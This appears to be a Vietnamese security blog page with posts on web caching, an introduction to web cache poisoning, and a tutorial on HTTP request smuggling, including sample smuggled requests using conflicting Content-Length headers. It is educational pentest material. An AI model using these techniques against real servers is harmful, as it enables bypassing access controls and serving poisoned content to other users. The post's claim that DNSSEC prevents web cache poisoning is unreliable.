<p>Tòm lại việc sử dụng cache rất có lợi cho website của bạn. Không những tối ưu băng thông, tốc độ cho cả người dùng lẫn server , cải thiện việc phân phối nội dung mà còn tăng khả năng bảo mật như chống DOS- DDOS.</p>
<h2>Cache Key</h2>



<p>Làm thế nào để web cache nhận diện ra được 2 request là tương tự, là giống nhau và quyết định gửi luôn response cho request  tương tự hay là chuyển lên server lấy new source về.   </p>
<p>Lập trình viên có thể cài đặt theo cơ chế so sánh byte to byte cho cache. Nhưng cách này kém hiệu quả vì quá trính xảy ra sẽ rất tốn thời gian và tài nguyên ngoài ra trong thành phần của request có nhiều header không ảnh hưởng đến response như “ User-Agent” chẳng hạn.</p>
<p>Có một cách khác đó chính là sử dụng Cache Key - là sử dụng một số thành phần cụ thể của HTTP request dùng để dùng để xác định resource đang được yêu cầu và các request tương đương . </p>
<img src="/images/Cache/image-7.png" class="[class names]" title="[500] [500] " alt="Ví dụ Cache key ( Màu cam)">


<p>Ngoài ra còn người ta còn sử dụng một header response là “Vary” - dùng để chỉ định những header (ngoại trừ đường dẫn-URL và Host ) nào thêm vào request cần bị khóa lại - để nhận response dúngý sẽ bắt buộc phải có các header được xác thực qua “vary”. Mặc dù header này rất hữu hiệu nhưng nếu sử dụng không chính xác có thể dẫn đến tình trạng tụt tỉ lệ hiệu suất, dữ kiệu chuyển đi bị sai lệch rất là cao nên header này được thiết lập qua loa hay thậm chí không được sử dụng.</p>
<!-- wp:image {"width":283,"height":148} -->
<figure class="wp-block-image is-resized"><img src="https://2.bp.blogspot.com/-E_npOkaDOHc/Ur8HBKisJxI/AAAAAAAAAO8/WhdtGvuDwsc/w1200-h630-p-k-no-nu/vary-header-not-working.png" alt="gZip Compression removes pre-existing vary header | Sitecore Tactics" width="283" height="148"/></figure>



<p><a href="https://www.keycdn.com/support/vary-header" target="_blank" rel="noreferrer noopener" aria-label="Chi tiết tham khảo (opens in a new tab)">Chi tiết tham khảo</a></p>
<p>Xong như vậy mình đã giới thiệu xong về web cache và cache key! Có gì thắc mặc các bạn có thể để lại comment bên dưới . Thank !</p>
<p>[UPDATE-10/4/2020]</p>
<h3>Làm sao để biết được reponse được trả về từ cache ?</h3>



<p>Một câu hỏi rất hay ! Mình cũng đã đi tìm và câu trả lời của mình lúc này cũng chưa chính thức nha. Theo như mình tìm hiểu sẽ có 2 cách để xác định được response đó từ cache hay trực tiếp từ server .</p>
<p>Cách đầu tiên đó là dựa vào “status code” HTTP và ở đây là mã “304 Not Modified” - không có sữa đổi. Điều này có nghĩa là tài nguyên được lấy lúc này không có gì thay đVổi và nó sẽ lấy từ cache về thay vì chuyển hướng đến server.</p>
<figure class="wp-block-image"><img src="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png" alt="HTTP Caching | Web Fundamentals | Google Developers"/></figure>



<p>Cách hai đó chính là dựa vào response header trong response được trả về đó là X-Cache và X-Cache-Lookup header. Thực chất 2 header này không phải là hai chuẩn được quy định trong RFC (Prefix “X”- không phải là chuẩn HTTP Header Field. Nó hay được dùng bởi các CDN và vì vậy các tên gọi của nó cũng có thể được thay đổi theo ý họ.</p>
<ul><li>"X-Cache" tương ứng với việc proxy có lấy response từ cache hay không (HIT  là có và MISS là không)</li><li>"X-Cache-Lookup"  sẽ nói là proxy có lưu response cho request tương ứng hay không (HIT là có và MISS là không) #Thông thừơng header này ít gặp nên mình cũng không rõ lắm.</li></ul>


<figure class="wp-block-image"><img src="https://1.bp.blogspot.com/--nwPp96Bsqc/W67uqZ76QPI/AAAAAAAAAHA/oSva9i5E4FsEeFfFa3Fsvjbn1GoeJ4segCLcBGAs/s1600/Screenshot_1.png" alt="Clement Nedelcu's Development Journal: How to fix: Nginx proxy or ..."/><figcaption>Ví dụ</figcaption></figure>



<p>Ngoài ra còn có các header khác như Age,Etag, exprires, Las-modified, cache-control cũng cho biết các thông tin về việc dữ liệu được lưu trữ trong cache.</p>
<h4>Link Tham khảo</h4>



<ul><li><a target="_blank" rel="noopener" href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/">https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/</a></li><li><a target="_blank" rel="noopener" href="https://vi.wikipedia.org/wiki/Web_caching">https://vi.wikipedia.org/wiki/Web_caching</a></li><li><a target="_blank" rel="noopener" href="https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/">https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/</a></li><li><a target="_blank" rel="noopener" href="https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8">https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8</a></li><li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules">https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules</a></li><li>#Response </li><li><a target="_blank" rel="noopener" href="https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/">https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/</a></li><li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017">https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017</a></li><li><a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching</a></li></ul>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/Web%20Cache%20&%20Cache%20Key/" data-id="ckhqle8tz000wo7jm70jbhjco" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Web Cache Poisoning  (Part 1)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/">Web Cache Poisoning (PART 1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Là một trong những lỗ hổng yêu thích nên mình sẽ viết hơi dài dòng một chút nên phần này mình dành cho những bạn nào mới tìm hiểu nha . Trong phần này mình sẽ giới thiệu về web cache poisoning và yếu tố dẫn đến lỗ hổng cùng mốt số cách khai thác.</p>
<p>Ngay khi bước vào tìm hiểu về web security chắc chắn sẽ ít ai để ý đến lỗ hổng này. Thậm trí trong các tài liệu và trong các khóa học đề cập rất ít đến nó nên vì thế lúc đầu  mình cũng không quan tâm cho lắm.Khi tìm hiểu về HTTP request Smuggling/ Response Splitting (lỗ hổng mình yêu thích ) thú vị thay mình tìm hiểu được về WCP. Nó rất thú vị như <a href="https://twitter.com/albinowax" target="_blank" rel="noreferrer noopener" aria-label="James Kettle (opens in a new tab)">James Kettle</a> nói !!! </p>
<p> Đầu tiên, cần phải biết web cache và cache key là gì đã ? Nếu bạn chưa biết bạn có thể tham khảo một <a target="_blank" rel="noopener" href="http://hydrasky.ml/2020/03/web-cache">bài viết </a>của mình.</p>
<h4>Web cache poisoning là gì ?</h4>



<p>Cứ theo tiếng anh mà dịch thì bạn cx đã hiểu được một phần rồi “Đầu độc web cache”. Bằng cách khai thác một sô vấn đề của máy chủ và lợi dụng cache để phản hồi lại các HTTP reponse có nội dung độc hại từ kẻ tấn công cho người khác.Và đặc biệt lỗ hổng này có thể ảnh hưởng với quy mô rộng  lớn khác với lại các lỗ hổng cùng họ như Web Cache Deception.</p>
<p>Theo như mình tìm kiếm được , WCP  đã được đề cập trong danh sách lỗ hổng từ năm 2009 của OWASP với một cái tên  “<a rel="noreferrer noopener" aria-label="Cache Poisoning (opens in a new tab)" href="https://owasp.org/www-community/attacks/Cache_Poisoning" target="_blank">Cache Poisoning</a>“ (Nghe rất chung chung bởi còn một số kiểu  cache poisoning khác thì sao như DNS cache poisoning-MITM …) . Điều thú vị nữa là vào thời điểm này người ta cho rằng lỗ hổng này chỉ ở mức “lý thuyết” (theoretical) khó thể khai thác thực tế. Và rồi đến năm 2018 , James Kettle là một chuyên gia, giám đốc mảng Web Security của <a rel="noreferrer noopener" aria-label="Portswigger  (opens in a new tab)" href="https://portswigger.net/about" target="_blank">Portswigger</a> đã có một bài thuyết trình  về lỗ hổng này <a target="_blank" rel="noopener" href="https://portswigger.net/research/practical-web-cache-poisoning">Practical Web Cache Poisoning: Redefining ‘Unexploitable’</a> <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=j2RrmNxJZ5c">[Video]</a> của <a target="_blank" rel="noopener" href="https://twitter.com/albinowax">James Kettle</a> trong sự kiện bảo mật thông tin hàng đầu trên thế giới “Blackhat”  và James Kettle đã chững minh cho tất cả thấy rằng Web Cache Poisoning là  “not theoretical “. Các bạn nên xem để hiểu rõ hơn.</p>
<figure class="wp-block-image"><img src="https://infosec-conferences.com/wp-content/uploads/2019/11/logo-conference-series-blackhat-v1.png" alt=""/><figcaption>Logo của sự kiện BlackHat</figcaption></figure>



<p>Và mình sẽ phân tích lỗ hổng này dựa vào bài thuyết trình của James Kettle. </p>
<h4>Một vài điểm lưu ý ở lỗ hổng này ?</h4>



<p>Xét về tính chất của cache thì ta chia ra làm 2 loại là private cache và pubic (shared) cache. Private cache là cache được lưu trữ phía client (brower cache), được lưu cục bộ  còn public cache là nằm giữa client và server (proxy cache). Với lỗ hổng WCP thì chúng ta chỉ quan tâm  tới việc làm sao đầu độc public cache từ đó tấn công ảnh hưởng đến toàn bộ người dùng cùng proxy cache đó còn Private cache không liên quan.</p>
<p>Lỗ hổng quan tâm đến <a rel="noreferrer noopener" aria-label="Cache key (opens in a new tab)" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">Cache key</a> , việc attacker xác định được cache key sẽ tăng khả năng bị tấn công. Ví dụ:</p>
<figure class="wp-block-image"><img src="https://i.imgur.com/wNyvExv.png" alt=""/></figure>



<p> Cache keys ở đây là phần bôi cam cam ở trên, nếu request nào match 2 cái đó thì resource từ cache sẽ được trả về với nội dung bằng tiếng Anh (en)</p>
<p>Tương tự như vậy nếu ta request tiếp nhưng thay đổi ngôn ngữ là tiếng Ba Lan: </p>
<figure class="wp-block-image"><img src="https://i.imgur.com/EbyDbkN.png" alt=""/></figure>



<p>Cache sẽ so sách cache key và thấy match 2 cái key đó sẽ lại trả nội dung về nhưng không phải là tiếng Ba Lan mà vẫn là tiếng Anh. Trườn hợp nguy hại hơn là một payload độc hại hay một file javascript có chứa lỗ hổng đã được caching cho request trước thì các người dùng sau sẽ đều bị ảnh hưởng cho đến khi một response mới được lưu. Điều đó sẽ có thể dẫn đến lỗ hổng Cache Poisoning. </p>
<h4>Cách thức tấn công</h4>



<p> Về cơ bản, Web cache poisoning bao 3 bước. </p>
<ul><li>Đầu tiên, kẻ tấn công phải tìm ra cách tạo ra response từ máy chủ back-end  bằng cách sử tìm thử các input không phải "cache key".</li><li>Tiếp theo là xem những chỗ input đó có thành lỗi được không.</li><li>Cuối cùng nếu có thì bắt đầu poison shared cache.  </li></ul>


<p> <strong>Xác định và đánh giá các input không phải key</strong> </p>
<p> Bất kỳ cuộc tấn công WCP nào đều phụ thuộc vào các input không phải key, chẳng hạn như các tiêu đề (header) . Bộ đệm web bỏ qua các đầu vào không phải key hoặc không bị khóa khi quyết định có nên trả về response được lưu trong bộ nhớ cache cho người dùng hay không. Điều có nghĩa là bạn có thể sử dụng các đầu vào không bị khóa để gửi payload của mình và tạo ra response bị “poisoned”, nếu được lưu trong bộ nhớ cache, sẽ được trả về cho tất cả người dùng có yêu cầu có khóa bộ đệm tương ứng. Do đó, bước đầu tiên của cuộc tấn công WCP là xác định các đầu vào không bị khóa được máy chủ sử dụng .</p>
<p> Bạn có thể xác định các đầu vào một cách thủ công bằng cách thêm các header vào các request và quan sát xem chúng có ảnh hưởng đến response hay không. Bạn có thể sử dụng các công cụ có khả năng chặn bắt và thay đổi gói tinh như <a rel="noreferrer noopener" aria-label="Burp Suite (opens in a new tab)" href="https://portswigger.net/burp/communitydownload" target="_blank">Burp Suite</a> của PortSwigger hoặc <a rel="noreferrer noopener" aria-label="ZAP  (opens in a new tab)" href="https://www.zaproxy.org/download/" target="_blank">ZAP </a>của OWASP. Cách có thể rất trực quan nhưng nó đòi hỏi nhiều công sức và thời gian. </p>
<!-- wp:image {"align":"center","width":399,"height":263} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.vietsunshine.com.vn/wp-content/uploads/2018/09/H%C6%B0%E1%BB%9Bng-d%E1%BA%ABn-Pentest-Black-Box-s%E1%BB%AD-d%E1%BB%A5ng-Burp-Suite-Ph%E1%BA%A7n-1-1.jpg" alt="Hướng dẫn Pentest Black Box sử dụng Burp Suite (Phần 1)" width="399" height="263"/><figcaption>Burp Suite</figcaption></figure></div>



<p>Thay vì vậy bạn có thể sử dụng các công cụ hỗ trợ như <a rel="noreferrer noopener" aria-label="Acunetix  (opens in a new tab)" href="https://www.acunetix.com/" target="_blank">Acunetix </a>- Scan lỗ hổng web tự động nhưng ta sẽ hơi bị động, <a rel="noreferrer noopener" aria-label="Param Miner (opens in a new tab)" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943" target="_blank">Param Miner</a> - một extention của Burp Suite giúp xác định các tham số (parm) bị ẩn, không liên  kết, đặc biệt hữu ích để tìm lỗ hổng độc hại bộ đệm web. </p>
<p>Mình khuyến khích các bạn nên dùng Burp Suite, nó thực sự hiệu quả.</p>
<p> <strong>Tìm ra mục độc hại trong các phản hồi từ server của mỗi input</strong> </p>
<p> Khi bạn đã xác định được đầu vào không phải key hoặc không bị khóa, bước tiếp theo là đánh giá chính xác cách trang web xử lý nó. Hiểu điều này là điều cần thiết để có thể tạo ra response độc hại. Nếu như giá trị từ đầu vào được nằm trong response từ máy chủ mà không bị loại bỏ hoặc được sử dụng tạo đường dẫn đến dữ liệu khác ( <strong>Host Header Attack</strong> ), thì đây là yếu tố có khả năng để làm ngộ độc web cache.</p>
<p> <strong>Lấy phản hồi được lưu trữ</strong> </p>
<p>Bước này chỉ là để kiểm tra việc đầu độc web cache đã thành công hay chưa. Việc đầu độc cache chiếm 50% tỉ lệ thành công còn lại phụ thuộc vào nhiều yếu tố khác như extention của file,content type, router,status code và response header.</p>
<p> Bạn nên dành một chút thời gian để tìm hiểu về các header, các request đến các server khác nhau  và nghiên cứu cách bộ đệm hoạt động thì việc hiểu và thực hiện tấn công sẽ dễ dàng hơn.</p>
<h4>Các mối đe dọa có thể xảy ra ?</h4>


<!-- wp:image {"width":592,"height":159} -->
<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/cache-poisoning.svg" alt="web cache poisoning" width="592" height="159"/></figure>



<p> Như với hầu hết các loại tấn công,  Web cache poisoning  cũng có thể được sử dụng kết hợp với các cuộc tấn công khác để leo thang tác động lớn hơn nữa ví dụ các lỗ hổng phổ biến như XSS, JavaScript inject, Open redirect, v.v. </p>
<p> Response độc hại chỉ ảnh hưởng đến người dùng truy cập trang bị ảnh hưởng trong khi cache bị đầu độc. Do đó, tác dộng có thể dao động từ không tồn tại đến lớn tùy thuộc vào việc trang có phổ biến hay không. Ví dụ, nếu kẻ tấn công quản lý để đầu độc một phản hồi được lưu trong bộ nhớ cache trên trang chủ của một trang web lớn như Facebook , thì cuộc tấn công có thể ảnh hưởng đến hàng ngàn người dùng mà không có bất kỳ tương tác nào sau đó từ kẻ tấn công. </p>
<h4>Cách thức ngăn chặn lỗ hổng này</h4>



<p>Về vấn dề ngăn chặn lỗ hổng này mình không tìm được nhiều tài liệu chi tết. chỉ trung trung vào việc cấu hình năng cao cho việc lưu trữ vào cache trên server nhưng vấn đề còn phụ thuộc vào mục đích , công việc kinh doanh và do bên thứ 3 như các CDN.</p>
<p> Ngoài ra còn có các công cụ có sẵn để giúp các tổ chức ngăn chặn các cuộc tấn công ngộ độc cache. Công cụ ngăn chặn ngộ độc bộ nhớ cache phổ biến nhất có lẽ là DNSSEC ( Domain Name System Security Extension). DNSSEC là một công cụ chống độc cache được phát triển bởi Lực lượng đặc nhiệm kỹ thuật Internet ( Internet Engineering Task Force ) để cung cấp xác thực dữ liệu DNS an toàn. </p>
<p>Ok như vậy là minh đã xong phần giới thiệu về lỗ hổng Web Cache Poisoning , trong phần tiếp theo mình sẽ trình bày các kĩ thuật và cách đầu độc Cache. Cảm ơn và mời các bạn đón đọc!!!! Bye</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/" data-id="ckhqle8u0000yo7jm2cudcown" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HTTP Request Smuggling Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/HTTP%20Request%20Smuggling%20Attack/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/HTTP%20Request%20Smuggling%20Attack/">HTTP Request Smuglling</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> Một trong các lỗ hổng  dựa vào tính năng của giao thức HTTP từ đó tạo các các thông điệp HTTP message đặc biệt ,phía server sẽ phân tích và diễn giải các message nhận được theo ý của attacker. HTTP Request Smuggling gọi tắt là HRS là một kĩ thuật , phương tiện tấn công năng cao, được công bố trong một <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liêu</a> vào năm 2005 bởi một công ty công nghệ Wathfire . HRS là kĩ thuật can thiệp vào việc xử lý tuần tự các  HTTP request tới một web site từ một hoặc nhiều user.</p>
<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/http-request-smuggling.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..."/><figcaption>src: PortSwigger</figcaption></figure>



<p>Lỗ hổng này thường được đánh giá ở mức Critical do HRS có khả năng bypass các kiểm soát truy cập, tường lửa web. Ngoài ra HRS còn là phương tiện để thực hiện các cuộc tấn công nguy hiểm khác như Web Cache Poisoning , Cross Site Scripting, Session Hijacking, Server-Side Requesr Forgery,Open Redirect,… Danh sách này còn có thể còn nhiều hơn nữa bởi còn nhiều kiểu tấn công chưa được khám phá.</p>
<h4> HTTP Request Smuggling sinh ra từ đâu?</h4>



<figure class="wp-block-image"><img src="https://documentation.help/DogeTool-HTTP-Requests-vt/http_requestmessageexample.png" alt="HTTP Request Message - HTTP Requests Documentation"/></figure>



<p>Hình trên là miêu tả các thành phần của một request, reponse chỉ hơi khác một chút , bây giờ mình cùng xem qua quy trình một gói request được xử lí nào !</p>
<p>Nhìn vào dòng request line ta sẽ thấy được server đang sử dụng giao thức HTTP/1.1 . Hiện nay  mặc dù Htpp/2 đã ra mắt để dần thay thế nó hay thậm chí Http/3 cũng được đề cập đến nhưng version này vẫn được sử dụng rất phổ biến rất , nó là bản nâng cấp của Http/1.0 với một tính năng mới cực kì hiệu quả cho việc truyền tải là 2 ae Keep-Alive và Pipeline. Để biết rõ về khác biệt giữa các version này là gì các bạn có thể tham khảo <a rel="noreferrer noopener" href="https://kipalog.com/posts/Luoc-su-tu-HTTP-1-toi-HTTP-2-va-tuong-lai-cua-HTTP" target="_blank">bài viết</a> này. </p>
<p>Một trong những vấn đề của Http 1.0 đó chính là chỉ có thể một connection tới một tài nguyên dẫn đến hiệu suất thấp và tốn nhiều thời gian,lưu lượng do quá trình bắt tay 3 bước TCP . Vì thế 2 tính năng Keep-Alive và Pipeline đã được thêm vào trong bản Http/1.1 để có thể tạo một connection tải nhiều tài nguyên . Với tính năng Keep-Alive, request sẽ được thêm một header đặc biệt là Connection: Keep-Alive , phía máy chủ sẽ nhận được request và hiểu là không được đóng kết nổi TCP , tương tự phía server sẽ dùng lại cái kết nối TCP này .Như vậy chỉ cần thực hiện một lần bắt tay ba bước , điều này có thể giảm lưu lượng tới máy chủ, tiết kiệm tài nguyên và tăng tốc truy cập. Tính năng này được bật mặc đinh khi sử dụng giao thức Http/1.1.</p>
<p>Đi cùng với Keep-Alive đó là Pipeline, để giải quyết vấn đề lộn xộn khi nhiều request cùng một lúc và thời gian khi phải chờ dợi response của request trước để thực hiện request tiếp theo trong cùng một connection.Http Pipeline sẽ cho phép việc gửi request liên tục mà không cần phải chờ đợi response của request trước nhưng vẫn phải theo tuần tự vào trước thì nhận trước. Tính năng này có một nhược điểm là nếu request trước nhận response chậm thì các request sau cũng phải chờ cho xong mới được nhận response của mình. Nhược điểm này còn có tên là head-of-line blocking, vấn đề này đã được khắc phục ở Http/2 và một biện pháp không liên quan nhưng lại có thể làm người ta quên đi pipeline nữa đó chính là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">CACHE</a> (tham khảo bài viết của mình). Cache rất hữu ích vì nó sẽ đưa HRS thành Web Cache Poisoning hehe.</p>
<p>Thực ra chúng ta chỉ cần quan tâm vè Keep-Alive cho lỗ hổng này, còn Pipeline thì không cần thiết vì tính năng này phức tạp,chứa nhược điểm lớn nên bình thường nó ko được dùng và bị disable trên trình duyệt,còn phía server vẫn hỗ trợ cho connection nào cần. Nhưng nói rồi thì nói luôn cho đỡ thắc mắc và mình đỡ quên hehe.</p>
<p>Ok như vậy với tính năng Keep-Alive ,request sẽ được  forward lần lượt đến Back-End Server thông qua Front-End Server (Proxy server, load banacer ) trên cùng một connection TLS/TCP. Ngoài ra khi đến Front-End Server,request cũng sẽ được phân tích để lưu vào cache .</p>
<!-- wp:image {"width":584,"height":328} -->
<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..." width="584" height="328"/></figure>



<p>Sau khi nhận request Back-End server sẽ phân tích các header của request để xác định khi nào sẽ kết thúc  một request vừa nhận và nhận request tiếp theo.</p>
<p>Lợi dụng điều này Attacker gửi một requets thập cẩm(nhưng có tính toán nha) để  lừa front-end server đó là 1 reuqest hợp lệ và chuyển tiếp đến Back-End. BE said “ bạn cho thì mình lấy thôi” , rồi  khi phân tích request  Back-End hiểu lầm là một phần của request thập cẩm đó là điểm bắt đầu và nó sẽ được gộp vào request sau đó (như phích và ổ cắm haha ). </p>
<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial & Examples | Web Security ..."/></figure>



<p>Sau đó request vẫn được thực hiện một cách hợp lệ response sẽ được trả về  ,như vậy attacker đã can thiệp vào việc xử lí của ứng dụng. =&gt; Smuggling attack !!!</p>
<figure class="wp-block-image"><img src="https://memn0ps.github.io/images/2019-09-13-HTTP-Request-Smuggling-CL-TE/screenshot2.png" alt="screenshot2"/><figcaption>Ví dụ minh họa</figcaption></figure>



<h4>Cách thức tấn công HTTP request smuggling</h4>



<p>Như mình đã giới thiệu bên trên, HRS lần đầu tiên được đưa ra vào <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liệu</a> năm 2005 bởi Watchfire, trong đó có nhắc đến 2 kiểu được sử dụng là CL và CL.CL, tác động chủ yếu ở phía người dụng cộng hưởng với việc là kĩ thuật khó , CDN chưa phổ biến do đó nó không được nhắc quá nhiều.Và đến năm 2019, Jame Kettle đã làm cho nó sống lại với <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">HTTP Desync Attacks</a> tại Black Hat và DEF CON cùng với đó là 3 kiểu mới được đưa ra là CL.TE, TE.CL và TE.TE.  Như vậy có thể chia ra làm 5 kiểu : CL, CL.CL, CL.TE, TE.CL và TE.TE, mình sẽ giải thích hết luôn hehe.</p>
<p>  CL và TE lần lượt viết tắt của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> và <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Transfer-Encoding</a> là 2 HTTP header . Content-Length cho biết kích thước của body của request, tính bằng byte, được gửi cho người nhận còn Transfer-Encoding chỉ định hình thức mã hóa (gzip, chunked.compress….) được sử dụng để đóng gói vận chuyển phần body một cách nhanh chóng, giải quyết được vấn đề của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> với dữ liệu lớn. Nhưng  tính năng quan trọng cần nhớ ở đây là 2 header này còn là cách xác định kết thúc một HTTP message. Đây là mấu chốt để thực hiện HRS ! </p>
<p>À còn một vấn đề nữa trước khi vào vấn đề là việc sử dụng các method HTTP (GET , POST, PUT …) phải hợp lí, không thể dùng bừa bởi vì mỗi methob đều có chức năng riêng và server sẽ xử lí khác nhau. Thế nên nó cũng ảnh hưởng đén việc tấn công bằng HRS,mình sẽ không thể giải thích cả vì nó sẽ quá dài mong các bạn lưu ý cả phần này. OK vào thôi  !</p>
<h3> **GET Request với CL ** </h3>



<p>Trong kiểu này không phải chỉ request GET có thể sử dụng, mình chỉ lấy như một ví dụ vì nó rất là điển hình.Tất cả các yêu cầu HTTP không mang body đều có khả năng làm điều này nhưng mình chưa biết hết hihi.</p>
<p>Trong tài liệu của <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Request_for_Comments" target="_blank">RFC</a> về HTTP/1.1 - <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a> không có quy định nào đề ra về việc cho phép yêu cầu GET mang thêm Body trong request như request POST và chỉ có một câu được đề cập trong phần 4.3.1 của tài liệu mới nhất của nó là  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.3" target="_blank">RFC7231</a>.</p>
<p>Sending a payload body on a GET request might cause some existing implementations to reject the request<br> </blockquote></p>
<p>Giả sử Front-End Server (Proxy Server) cho phép  GET request mang Body và Back-end Server không cho phép GET request mang Body.Như vậy Back-end Server sẽ  bỏ qua luônContent-Length header trong request GET và sẽ không xử lý nó.Điều này có thể dẫn đến request Smuggling. Cùng xem ví dụ nha.</p>
<p>GET / HTTP/1.1\r\n<br>Host: example.com\r\n<br>Content-Length: 44\r\n # 44 byte</p>
<p>GET / secret HTTP/1.1\r\n #độ dài của đoạn<br>Host: example.com\r\n     # này bằng 44 byte<br>\r\n</p>
<p>Front-end Server nhận được request và kiểm traContent-Length, xác định rằng đây là một request hoàn chỉnh và  chuyển tiếp nó đến back-end Server.Sau đó back-end Server nhận được nó, vì nó không xử lýContent-Length,  nên nó nghĩ rằng nó đang nhận được hai request. </p>
<p>First request<br>GET / HTTP/1.1\r\n<br>Host: example.com\r\n</p>
<p>Second request<br>GET / secret HTTP/1.1\r\n<br>Host: example.com\r\n</p>
<p>Done !!!</p>
<h3>CL.CL</h3>



<p>Trong mục 4.4 của <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank">RFC2616</a> và mục 4 của 3.3.3 trong  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank">RFC7230</a>, có ghi rằng khi request  mà máy chủ nhận được chứa hai hoặc nhiều hơn Content-Length header và  giá trị của các header này khác nhau thì nó sẽ trả về status code 400 hoặc 502. Như vậy khả năng cáo Server sẽ không chấp nhận request kiểu này và cũng vì thế người ta chỉ coi kiểu này chỉ ở mức ý tưởng. </p>
<p>If a message is received without Transfer-Encoding and witheither multiple Content-Length header fields having differingfield-values or a single Content-Length header field having aninvalid value, then the message framing is invalid and therecipient MUST treat it as an unrecoverable error. If this is arequest message, the server MUST respond with a 400 (Bad Request)status code and then close the connection. If this is a responsemessage received by a proxy, the proxy MUST close the connectionto the server, discard the received response, and send a 502 (Bad Gateway) response to the client. If this is a response messagereceived by a user agent, the user agent MUST close theconnection to the server and discard the received response.Các bạn tự dịch nhé !</blockquote></p>
<p>Nó đã được fix nhưng không sao mình vẫn sẽ trình bày về nó như trong tài liệu của Watchfire sử dụng nó để thực hiện HRS thành công.</p>
<p>Lần này mình lấy ví dụ dùng POST request,không như GET, server sẽ kiểm tra cả CL header để lấy dữ liệu  nhé !</p>
<p>POST / HTTP/1.1\r\n<br>Host: example.com\r\n<br>Content-Length: 8\r\n<br>Content-Length: 7\r\n</p>
<p>12345\r\n<br>a</p>
<p>Theo như minh tìm hiểu nếu như sử dụng 2 header CL thì thông thường Proxy Server sẽ lấy Content-Length đầu tiên còn Back-End sẽ phân tích và lấy Content-Length cuối cùng, tại sao thì mình chưa tìm ra nhưng nó không ảnh hưởng lắm nên thôi .</p>
